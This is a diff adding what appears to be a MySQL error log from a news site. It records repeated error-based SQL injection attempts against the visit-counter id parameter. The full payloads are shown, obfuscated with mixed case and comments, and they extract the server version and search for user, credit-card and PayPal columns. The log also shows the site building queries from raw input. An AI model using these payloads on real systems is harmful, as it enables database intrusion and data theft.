@@ -1,0 +1,103 @@
+Time : 23:11:47
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 23:11:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 23:11:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 23:11:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 23:11:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 23:11:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 23:11:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 23:11:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT/**/1/**//**/fRoM(/**/sElEcT/**/count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT/**//**/cOnCaT(char(33,126,33),/**/vErSiOn(),char(33,126,33)))/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/lImIt/**/0,1),floor(rand(0)*2))x/**//**/fRoM/**/information_schema./**/tAbLeS/**//**/gRoUp/**/bY/**/x)a)
+
+Time : 22:52:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 22:34:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 16:03:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 13:07:54
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(sElEcT/**/1/**/fRoM(sElEcT/**/count(*),cOnCaT((sElEcT(sElEcT(sElEcT/**/cOnCaT(char(33,126,33),count(t.tAbLe_nAmE),char(33,126,33))/**/fRoM/**/information_schema.sChEmAtA/**/as/**/d/**/join/**/information_schema.tAbLeS/**/as/**/t/**/on/**/t.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/join/**/information_schema.cOlUmNs/**/as/**/c/**/on/**/c.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/and/**/c.tAbLe_nAmE/**/=/**/t.tAbLe_nAmE/**/wHeRe/**/not/**/c.tAbLe_sChEmA/**/in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)/**/and/**/d.sChEmA_NaMe/**/=/**/dAtAbAsE()/**/and/**/c.cOlUmN_NaMe/**/like/**/0x255553455225))/**/fRoM/**/information_schema.tAbLeS/**/lImIt/**/0,1),floor(rand(0)*2))x/**/fRoM/**/information_schema.tAbLeS/**/gRoUp/**/bY/**/x)a)
+
+Time : 13:07:50
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(sElEcT/**/1/**/fRoM(sElEcT/**/count(*),cOnCaT((sElEcT(sElEcT(sElEcT/**/cOnCaT(char(33,126,33),count(t.tAbLe_nAmE),char(33,126,33))/**/fRoM/**/information_schema.sChEmAtA/**/as/**/d/**/join/**/information_schema.tAbLeS/**/as/**/t/**/on/**/t.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/join/**/information_schema.cOlUmNs/**/as/**/c/**/on/**/c.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/and/**/c.tAbLe_nAmE/**/=/**/t.tAbLe_nAmE/**/wHeRe/**/not/**/c.tAbLe_sChEmA/**/in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)/**/and/**/d.sChEmA_NaMe/**/=/**/dAtAbAsE()/**/and/**/c.cOlUmN_NaMe/**/like/**/0x25495025))/**/fRoM/**/information_schema.tAbLeS/**/lImIt/**/0,1),floor(rand(0)*2))x/**/fRoM/**/information_schema.tAbLeS/**/gRoUp/**/bY/**/x)a)
+
+Time : 13:07:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(sElEcT/**/1/**/fRoM(sElEcT/**/count(*),cOnCaT((sElEcT(sElEcT(sElEcT/**/cOnCaT(char(33,126,33),count(t.tAbLe_nAmE),char(33,126,33))/**/fRoM/**/information_schema.sChEmAtA/**/as/**/d/**/join/**/information_schema.tAbLeS/**/as/**/t/**/on/**/t.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/join/**/information_schema.cOlUmNs/**/as/**/c/**/on/**/c.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/and/**/c.tAbLe_nAmE/**/=/**/t.tAbLe_nAmE/**/wHeRe/**/not/**/c.tAbLe_sChEmA/**/in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)/**/and/**/d.sChEmA_NaMe/**/=/**/dAtAbAsE()/**/and/**/c.cOlUmN_NaMe/**/like/**/0x2543524544495425))/**/fRoM/**/information_schema.tAbLeS/**/lImIt/**/0,1),floor(rand(0)*2))x/**/fRoM/**/information_schema.tAbLeS/**/gRoUp/**/bY/**/x)a)
+
+Time : 13:07:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(sElEcT/**/1/**/fRoM(sElEcT/**/count(*),cOnCaT((sElEcT(sElEcT(sElEcT/**/cOnCaT(char(33,126,33),count(t.tAbLe_nAmE),char(33,126,33))/**/fRoM/**/information_schema.sChEmAtA/**/as/**/d/**/join/**/information_schema.tAbLeS/**/as/**/t/**/on/**/t.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/join/**/information_schema.cOlUmNs/**/as/**/c/**/on/**/c.tAbLe_sChEmA/**/=/**/d.sChEmA_NaMe/**/and/**/c.tAbLe_nAmE/**/=/**/t.tAbLe_nAmE/**/wHeRe/**/not/**/c.tAbLe_sChEmA/**/in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)/**/and/**/d.sChEmA_NaMe/**/=/**/dAtAbAsE()/**/and/**/c.cOlUmN_NaMe/**/like/**/0x2550415950414c25))/**/fRoM/**/information_schema.tAbLeS/**/lImIt/**/0,1),floor(rand(0)*2))x/**/fRoM/**/information_schema.tAbLeS/**/gRoUp/**/bY/**/x)a)
+
+Time : 13:07:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(sElEcT/**/1/**/fRoM(sElEcT/**/count(*),cOnCaT((sElEcT(sElEcT/**/cOnCaT(char(33,126,33),vErSiOn(),char(33,126,33)))/**/fRoM/**/information_schema.tAbLeS/**/lImIt/**/0,1),floor(rand(0)*2))x/**/fRoM/**/information_schema.tAbLeS/**/gRoUp/**/bY/**/x)a)
+
+Time : 13:07:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(sElEcT/**/1/**/fRoM(sElEcT/**/count(*),cOnCaT((sElEcT(sElEcT/**/cOnCaT(char(33,126,33),vErSiOn(),char(33,126,33)))/**/fRoM/**/information_schema.tAbLeS/**/lImIt/**/0,1),floor(rand(0)*2))x/**/fRoM/**/information_schema.tAbLeS/**/gRoUp/**/bY/**/x)a)
+
+Time : 09:30:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/aes_decrypt(aes_encrypt(concat(char(33,126,33),version(),char(33,126,33' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=extractvalue(rand(),(select/**/aes_decrypt(aes_encrypt(concat(char(33,126,33),version(),char(33,126,33)),1),1)))
+
+Time : 09:30:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/aes_decrypt(ae' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/aes_decrypt(aes_encrypt(concat(char(33,126,33),version(),char(33,126,33)),1),1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
+
+Time : 09:30:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/convert(conc' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/convert(concat(char(33,126,33),version(),char(33,126,33))/**/using/**/latin1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
+
+Time : 09:30:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/convert(conc' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/convert(concat(char(33,126,33),version(),char(33,126,33))/**/using/**/utf8))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
+
+Time : 09:30:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/uncompress(com' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/uncompress(compress(concat(char(33,126,33),version(),char(33,126,33)))))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
+
+Time : 09:30:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/cast(concat(' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/cast(concat(char(33,126,33),version(),char(33,126,33))/**/as/**/char))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
+
+Time : 09:30:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/binary(concat' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/binary(concat(char(33,126,33),version(),char(33,126,33))))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
+
+Time : 09:30:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/unhex(hex(co' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/unhex(hex(concat(char(33,126,33),version(),char(33,126,33)))))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
+
+Time : 09:30:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ect/**/1/**/from(select/**/count(*),concat((select(select/**/concat(char(3' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(select/**/1/**/from(select/**/count(*),concat((select(select/**/concat(char(33,126,33),version(),char(33,126,33)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)
